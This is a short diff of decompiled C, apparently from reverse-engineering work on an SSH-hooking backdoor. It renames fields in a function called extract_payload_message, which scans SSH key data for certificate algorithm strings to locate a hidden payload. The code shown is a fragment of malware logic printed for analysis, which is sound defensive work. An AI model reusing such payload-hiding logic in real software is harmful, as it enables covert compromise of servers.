@@ -44,10 +44,10 @@ BOOL extract_payload_message
     return FALSE;
   }
   if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
-    if (ctx->STR_ssh_rsa_cert_v01_openssh_com == (char *)0x0) {
+    if (ctx->ssh_rsa_cert_alg == (char *)0x0) {
       return FALSE;
     }
-    if (ctx->STR_rsa_sha2_256 == (char *)0x0) {
+    if (ctx->rsa_sha2_256_alg == (char *)0x0) {
       return FALSE;
     }
     sshbuf_cursor = sshbuf_data->d;
@@ -60,14 +60,14 @@ BOOL extract_payload_message
       cmp_index = 0;
       window_len = sshbuf_size - search_offset;
       while( TRUE ) {
-        cVar2 = ctx->STR_ssh_rsa_cert_v01_openssh_com[cmp_index];
+        cVar2 = ctx->ssh_rsa_cert_alg[cmp_index];
         if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
         cmp_index = cmp_index + 1;
         if (cmp_index == 7) goto LAB_00107fd1;
       }
       cmp_index = 0;
       while( TRUE ) {
-        cVar2 = ctx->STR_rsa_sha2_256[cmp_index];
+        cVar2 = ctx->rsa_sha2_256_alg[cmp_index];
         if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
         cmp_index = cmp_index + 1;
         if (cmp_index == 7) goto LAB_00107fd1;
